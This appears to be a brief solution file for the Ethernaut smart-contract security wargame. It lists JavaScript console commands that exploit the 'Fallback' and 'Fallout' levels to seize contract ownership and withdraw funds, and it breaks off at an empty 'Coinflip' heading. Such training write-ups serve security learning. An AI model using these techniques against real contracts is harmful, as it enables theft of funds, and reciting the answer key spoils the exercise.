# Ethernaut solution

## 1. Fallback
Abusing erroneous logic between the functions and fallback function
```
await contract.contribute({value: 1234});
await contract.sendTransaction({value: 1234});
await contract.withdraw();
```

## 2. Fallout
Constructor is spelled wrongly; becomes a regular function
```
await contract.Fal1out({value: 1234});
await contract.sendAllocation(await contract.owner());
```

## 3. Coinflip

